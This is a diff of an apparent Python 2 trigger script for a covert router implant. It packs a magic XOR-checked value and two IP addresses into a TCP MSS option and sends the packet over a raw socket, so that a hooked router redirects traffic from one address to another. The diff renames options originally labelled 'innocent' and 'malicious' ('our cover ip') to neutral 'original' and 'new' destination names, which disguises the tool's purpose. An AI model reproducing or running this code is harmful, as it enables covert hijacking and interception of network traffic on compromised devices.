@@ -10,19 +10,19 @@ XOR_MAGIC = 0xdeadbeef
 MAX_UINT32 = 2**32
 
 parser = OptionParser()
-parser.add_option("-i", "--ip-innocent", dest='innocent', help="our cover ip")
-parser.add_option("-m", "--ip-malicious", dest='malicious', help="our malicous ip")
+parser.add_option("-od", "--orig-dest", dest='original_ip', help="original ip destination")
+parser.add_option("-nd", "--new-dest", dest='new_ip', help="new ip destination")
 parser.add_option("-c", "--clear", action='store_true', dest='clear', help="clear our IP hook")
 (options, args) = parser.parse_args()
 if options.clear:
-    options.innocent = "0.0.0.0"
-    options.malicious = "0.0.0.0"
-if not options.innocent: 
-    parser.error('innocent ip not given')
-if not options.malicious: 
-    parser.error('malicious ip not given')
+    options.original_ip = "0.0.0.0"
+    options.new_ip = "0.0.0.0"
+if not options.original_ip: 
+    parser.error('original dest ip not given')
+if not options.new_ip: 
+    parser.error('new dest ip not given')
 
-print "router will change %s->%s" % (options.innocent, options.malicious)
+print "router hooked %s to %s" % (options.original_ip, options.new_ip)
 
 random_number = random.randint(0, MAX_UINT32)
 xored_random_numer = random_number ^ XOR_MAGIC
@@ -37,8 +37,8 @@ tcp = TCP(sport= random.randint(1000,2**16),
           options = [('MSS',
                       struct.pack("<I", random_number) + 
                       struct.pack("<I", xored_random_numer) +
-                      socket.inet_aton(options.innocent) + 
-                      socket.inet_aton(options.malicious)
+                      socket.inet_aton(options.original_ip) + 
+                      socket.inet_aton(options.new_ip)
           )])
 # send packet using raw socket
 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
@@ -48,4 +48,3 @@ s.sendto(bytes(ip/tcp), ("8.8.8.8" , 0 ))
 
 # using scpay
 #send(ip/tcp)
-
